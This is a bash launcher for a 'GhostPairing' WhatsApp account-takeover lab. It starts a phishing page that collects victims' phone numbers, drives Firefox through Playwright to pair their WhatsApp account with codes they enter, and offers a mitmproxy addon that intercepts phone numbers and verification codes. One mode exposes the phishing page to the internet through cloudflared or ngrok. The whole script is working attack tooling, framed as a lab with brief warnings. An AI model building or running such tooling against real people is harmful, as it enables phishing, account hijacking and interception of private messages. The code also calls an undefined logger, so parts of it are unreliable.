#!/bin/bash
set -euo pipefail

readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly LOG_DIR="${SCRIPT_DIR}/logs"

echo "========================================"
echo "   GHOSTPAIRING ATTACK LAB - LAUNCHER"
echo "      WITH BROWSER AUTOMATION"
echo "========================================"
echo ""

# Check requirements
if ! command -v python3 &>/dev/null; then
    echo "[✗] Python3 is not installed"
    echo "[i] Install with: sudo apt-get install python3 python3-pip"
    exit 1
fi

# Check if virtual environment exists, create if not
if [[ ! -d "venv" ]]; then
    echo "[!] Virtual environment not found. Run ./setup.sh first"
    exit 1
fi

source venv/bin/activate

# Fix for running as root with user's X11 display
if [[ $EUID -eq 0 ]] && [[ -n "${DISPLAY:-}" ]]; then
    echo "========================================"
    echo "   FIREFOX AUTOMATION FIX NEEDED"
    echo "========================================"
    echo ""
    echo "[!] Firefox refuses to run as root with a user's X11 session"
    echo "[!] This is a Firefox security policy, not a script bug"
    echo ""
    echo "SOLUTION: Re-run as the kali user"
    echo ""
    echo "Run these commands:"
    echo "  su - kali"
    echo "  cd \$(pwd)"
    echo "  ./run.sh"
    echo ""
    echo "Alternatively, run directly:"
    echo "  sudo -u kali -E bash \$(pwd)/run.sh"
    echo ""
    read -p "Press Enter to exit (Ctrl+C to force continue as root)..."
    exit 0
fi

# Check if requirements are installed
if ! python3 -c "import fastapi" &>/dev/null; then
    echo "[!] Installing Python dependencies..."
    pip install -r requirements.txt
fi

# Check Playwright installation
if ! python3 -c "import playwright" &>/dev/null; then
    echo "[!] Playwright not installed. Browser automation will not work."
    echo "[i] Install with: pip install playwright && playwright install firefox"
    read -p "Continue without automation? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
    AUTOMATION_AVAILABLE=false
else
    AUTOMATION_AVAILABLE=true
    echo "[✓] Playwright automation available"
fi

# Create log directory
mkdir -p "${LOG_DIR}"

# Function to check port
check_port() {
    local port=$1
    if command -v lsof &>/dev/null; then
        lsof -ti:"${port}" >/dev/null 2>&1 && return 0 || return 1
    elif command -v ss &>/dev/null; then
        ss -tuln | grep -q ":${port} " && return 0 || return 1
    elif command -v netstat &>/dev/null; then
        netstat -tuln | grep -q ":${port} " && return 0 || return 1
    else
        echo "[!] Warning: No port checking tool available"
        return 1
    fi
}

# Kill processes on ports 8000 and 8080 if they're running
for port in 8000 8080; do
    if check_port "${port}"; then
        echo "[!] Port ${port} is in use. Stopping existing processes..."
        if command -v lsof &>/dev/null; then
            lsof -ti:"${port}" | xargs kill -9 2>/dev/null || true
        elif command -v fuser &>/dev/null; then
            fuser -k "${port}/tcp" 2>/dev/null || true
        fi
        sleep 2
    fi
done

# Check for ngrok/cloudflared
TUNNEL_AVAILABLE=false
if command -v cloudflared &>/dev/null; then
    TUNNEL_AVAILABLE=true
    TUNNEL_TOOL="cloudflared"
elif command -v ngrok &>/dev/null; then
    TUNNEL_AVAILABLE=true
    TUNNEL_TOOL="ngrok"
fi

# Display menu
echo ""
echo "Select launch mode:"
echo ""
echo "  1) 🚀 Local with AUTOMATION (Firefox opens automatically)"
echo "  2) 🔍 Local + MITMProxy + Automation (intercept & automate)"
if $TUNNEL_AVAILABLE; then
    echo "  3) 🌐 Public tunnel with automation (expose to internet)"
fi
echo "  4) 📊 Admin dashboard only (monitor attacks)"
echo "  5) 🧪 Test automation setup"
echo ""
read -p "Enter choice [1]: " choice
choice=${choice:-1}

case $choice in
    1)
        echo ""
        echo "[1] Starting GhostPairing server WITH AUTOMATION..."
        echo "    Firefox will open automatically when attacks start"
        echo ""
        python3 server.py &
        SERVER_PID=$!
        echo "[✓] Server started (PID: $SERVER_PID)"
        
        sleep 3
        echo ""
        echo "========================================"
        echo "     GHOSTPAIRING AUTOMATION LAB READY"
        echo "========================================"
        echo ""
        echo "🌐 Phishing page:     http://localhost:8000"
        echo "📊 Admin dashboard:   http://localhost:8000/admin"
        echo "🤖 Automation test:   http://localhost:8000/test-automation"
        echo "📝 Server logs:       ${LOG_DIR}/ghostpairing.log"
        echo ""
        echo "🚀 TEST FLOW:"
        echo "  1. Visit http://localhost:8000"
        echo "  2. Enter YOUR phone number"
        echo "  3. Firefox opens to web.whatsapp.com"
        echo "  4. WhatsApp sends REAL code to your phone"
        echo "  5. Enter code on phishing page"
        echo "  6. Code auto-entered in Firefox → Account paired!"
        echo ""
        echo "⚠️  WARNING: This performs REAL WhatsApp pairing"
        echo "    Only use with accounts you own!"
        echo ""
        echo "Press Ctrl+C to stop server and all automations"
        echo ""
        
        wait $SERVER_PID
        ;;
        
    2)
        if ! $AUTOMATION_AVAILABLE; then
            echo "[✗] Automation not available"
            echo "[i] Install Playwright first: pip install playwright && playwright install firefox"
            exit 1
        fi
        
        echo ""
        echo "[1] Starting MITMProxy on port 8080..."
        echo "    Configure Firefox to use proxy: localhost:8080"
        echo ""
        
        # Create mitmproxy config for automation
        cat > mitm_automation.py <<'MITMEOF'
#!/usr/bin/env python3
"""MITMProxy addon for intercepting WhatsApp traffic with automation support"""

import re
import json
from mitmproxy import http


def request(flow: http.HTTPFlow) -> None:
    """Intercept WhatsApp verification requests"""
    if not flow.request.host:
        return

    # Look for WhatsApp verification requests
    if "whatsapp" in flow.request.host or "wa.me" in flow.request.host:
        print(f"[MITM] WhatsApp request: {flow.request.method} {flow.request.url}")

        # Check for phone numbers in request
        if flow.request.content:
            try:
                content = flow.request.content.decode('utf-8', errors='ignore')
                if "phone" in content.lower() or "number" in content.lower():
                    print("[MITM] Possible phone number in WhatsApp request")
                    
                    # Extract phone number if possible
                    phone_match = re.search(r'phone[^0-9]*([0-9+]{10,})', content, re.IGNORECASE)
                    if phone_match:
                        phone = phone_match.group(1)
                        print(f"[MITM] 📱 Extracted phone number: {phone}")
                        
                        # Send to our server
                        try:
                            import requests
                            requests.post(
                                "http://localhost:8000/api/mitm-phone",
                                json={"phone": phone, "source": "mitmproxy"},
                                timeout=1
                            )
                        except Exception as e:
                            logger.debug(f"Attempt failed: {e}")
                            pass

            except UnicodeDecodeError as e:
                print(f"[MITM] Error decoding request: {e}")
            except Exception as e:
                print(f"[MITM] Error in request handler: {e}")


def response(flow: http.HTTPFlow) -> None:
    """Intercept WhatsApp verification responses"""
    if not flow.response or not flow.response.content:
        return

    try:
        content = flow.response.content.decode('utf-8', errors='ignore')

        # Look for WhatsApp verification codes
        if "code" in content.lower() and ("whatsapp" in flow.request.host or "verify" in content.lower()):
            codes = re.findall(r'\b\d{6}\b', content)
            for code in codes:
                print(f"[MITM] ⚠️  INTERCEPTED VERIFICATION CODE: {code}")

                # Send to our server
                try:
                    import requests
                    requests.post(
                        "http://localhost:8000/api/intercept",
                        json={"code": code, "source": "mitmproxy", "host": flow.request.host},
                        timeout=1
                    )
                except requests.RequestException as e:
                    print(f"[MITM] Failed to send code to server: {e}")
                except Exception as e:
                    print(f"[MITM] Error sending code: {e}")

    except UnicodeDecodeError as e:
        print(f"[MITM] Error decoding response: {e}")
    except Exception as e:
        print(f"[MITM] Error in response handler: {e}")
MITMEOF
        
        mitmdump -s mitm_automation.py --listen-port 8080 --ssl-insecure \
            --set block_global=false > "${LOG_DIR}/mitmproxy.log" 2>&1 &
        MITM_PID=$!
        
        echo "[2] Starting GhostPairing server with automation..."
        python3 server.py > "${LOG_DIR}/server.log" 2>&1 &
        SERVER_PID=$!
        
        sleep 3
        echo ""
        echo "========================================"
        echo "  GHOSTPAIRING + MITM + AUTOMATION READY"
        echo "========================================"
        echo ""
        echo "🌐 Phishing page:  http://localhost:8000"
        echo "🔧 MITMProxy:      http://localhost:8080"
        echo "🤖 Automation:     Firefox auto-opens for attacks"
        echo "📊 Admin panel:    http://localhost:8000/admin"
        echo ""
        echo "Dual testing mode:"
        echo "  Option A: Use phishing page with automation"
        echo "  Option B: Configure browser proxy to localhost:8080"
        echo "            Visit real web.whatsapp.com"
        echo "            MITMProxy intercepts traffic"
        echo ""
        echo "Press Ctrl+C to stop all services"
        echo ""
        
        trap 'kill $SERVER_PID $MITM_PID 2>/dev/null; exit 0' INT
        wait
        ;;
        
    3)
        if ! $TUNNEL_AVAILABLE; then
            echo "[✗] Tunnel tool not available"
            echo "[i] Install cloudflared (recommended): https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/"
            echo "[i] Or install ngrok (alternative): https://ngrok.com/download"
            exit 1
        fi
        
        if ! $AUTOMATION_AVAILABLE; then
            echo "[✗] Automation not available"
            echo "[i] Install Playwright first"
            exit 1
        fi
        
        echo ""
        echo "[1] Starting GhostPairing server with automation..."
        python3 server.py > "${LOG_DIR}/server.log" 2>&1 &
        SERVER_PID=$!
        
        sleep 2
        
        echo "[2] Starting ${TUNNEL_TOOL} tunnel (cloudflared recommended)..."
        if [[ "$TUNNEL_TOOL" == "cloudflared" ]]; then
            echo "[✓] Using cloudflared (recommended tunnel tool)"
            cloudflared tunnel --url http://localhost:8000 > "${LOG_DIR}/tunnel.log" 2>&1 &
            TUNNEL_PID=$!
            sleep 5
            
            # Try to extract URL
            echo "[i] Waiting for tunnel URL..."
            sleep 3
            if grep -q "trycloudflare.com" "${LOG_DIR}/tunnel.log"; then
                TUNNEL_URL=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' "${LOG_DIR}/tunnel.log" | head -1)
                echo "[✓] Tunnel URL: ${TUNNEL_URL}"
            else
                echo "[!] Check ${LOG_DIR}/tunnel.log for URL"
            fi
            
        elif [[ "$TUNNEL_TOOL" == "ngrok" ]]; then
            echo "[!] Using ngrok (cloudflared is recommended for better reliability)"
            ngrok http 8000 > "${LOG_DIR}/tunnel.log" 2>&1 &
            TUNNEL_PID=$!
            sleep 5
            
            # Try to get ngrok URL
            if curl -s http://localhost:4040/api/tunnels > /tmp/ngrok.json 2>&1; then
                TUNNEL_URL=$(python3 -c "import json; data=json.load(open('/tmp/ngrok.json')); print(data['tunnels'][0]['public_url'])" 2>/dev/null || echo "")
                if [[ -n "$TUNNEL_URL" ]]; then
                    echo "[✓] Tunnel URL: ${TUNNEL_URL}"
                fi
            fi
        fi
        
        echo ""
        echo "========================================"
        echo "  PUBLIC GHOSTPAIRING LAB READY"
        echo "========================================"
        echo ""
        if [[ -n "$TUNNEL_URL" ]]; then
            echo "🌐 Public URL:     ${TUNNEL_URL}"
        fi
        echo "🏠 Local URL:      http://localhost:8000"
        echo "🤖 Automation:     Firefox auto-opens for attacks"
        echo "📊 Admin panel:    http://localhost:8000/admin"
        echo ""
        echo "🚨 EXTREME WARNING: This is exposed to the internet!"
        echo "    • Anyone with the URL can launch attacks"
        echo "    • Firefox will open on YOUR machine for THEIR attacks"
        echo "    • Use only in controlled, authorized environments"
        echo "    • Consider using VPN or authentication"
        echo ""
        echo "Press Ctrl+C to stop all services"
        echo ""
        
        trap 'kill $SERVER_PID $TUNNEL_PID 2>/dev/null; exit 0' INT
        wait
        ;;
        
    4)
        echo ""
        echo "[1] Starting admin dashboard server..."
        python3 -c "
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import uvicorn
import sqlite3
import json

app = FastAPI()

@app.get('/')
async def admin():
    try:
        with open('admin_dashboard.html', 'r', encoding='utf-8') as f:
            return HTMLResponse(f.read())
    except (FileNotFoundError, IOError) as e:
        logger.error(f"Failed to load admin dashboard: {e}")
        return HTMLResponse('<h1>Admin Dashboard</h1><p>Use main server for full dashboard</p>')

@app.get('/api/stats')
async def stats():
    try:
        conn = sqlite3.connect('databases/whatsapp.db')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM attacks')
        total = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM attacks WHERE status=\"success\"')
        success = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM attacks WHERE automation_started=1')
        automation = cursor.fetchone()[0]
        conn.close()
        return {'total': total, 'success': success, 'automation': automation}
    except (sqlite3.Error, TypeError, IndexError) as e:
        logger.error(f"Failed to get stats: {e}")
        return {'total': 0, 'success': 0, 'automation': 0}

print('Admin dashboard on http://localhost:8001')
uvicorn.run(app, host='0.0.0.0', port=8001)
" &
        ADMIN_PID=$!
        
        echo "[✓] Admin dashboard started (PID: $ADMIN_PID)"
        echo ""
        echo "🌐 URL: http://localhost:8001"
        echo ""
        echo "Press Ctrl+C to stop"
        
        wait $ADMIN_PID
        ;;
        
    5)
        echo ""
        echo "🧪 Testing automation setup..."
        echo ""
        python3 << 'TESTEOF'
import sys
import subprocess

print("Testing GhostPairing automation setup...")
print("=" * 50)

# Test 1: Python dependencies
print("\n1. Checking Python dependencies:")
try:
    import fastapi
    print("   ✓ FastAPI")
except ImportError:
    print("   ✗ FastAPI")

try:
    import playwright
    print("   ✓ Playwright")
except ImportError:
    print("   ✗ Playwright")

try:
    import sqlite3
    print("   ✓ SQLite3")
except ImportError:
    print("   ✗ SQLite3")

# Test 2: Firefox availability
print("\n2. Checking Firefox:")
firefox_result = subprocess.run(['which', 'firefox'], capture_output=True, text=True)
if firefox_result.returncode == 0:
    print(f"   ✓ Firefox found: {firefox_result.stdout.strip()}")
else:
    print("   ✗ Firefox not found in PATH")

# Test 3: Playwright browsers
print("\n3. Checking Playwright browsers:")
try:
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        browsers = p.firefox
        print("   ✓ Playwright Firefox API available")
except Exception as e:
    print(f"   ✗ Playwright error: {e}")

# Test 4: Database
print("\n4. Checking database:")
import os
if os.path.exists("databases/whatsapp.db"):
    print("   ✓ Database file exists")
else:
    print("   ✗ Database file not found")

# Test 5: Display server
print("\n5. Checking display server:")
import os
if 'DISPLAY' in os.environ:
    print(f"   ✓ DISPLAY set: {os.environ['DISPLAY']}")
else:
    print("   ✗ DISPLAY not set (headless mode)")

print("\n" + "=" * 50)
print("Automation test complete.")
print("\nNext steps:")
print("1. Run: ./run.sh (choose mode 1)")
print("2. Open: http://localhost:8000")
print("3. Enter phone number to test automation")
TESTEOF
        ;;
        
    *)
        echo "[✗] Invalid choice"
        exit 1
        ;;
esac

echo ""
echo "========================================"
echo "           LAB SHUTDOWN COMPLETE"
echo "========================================"
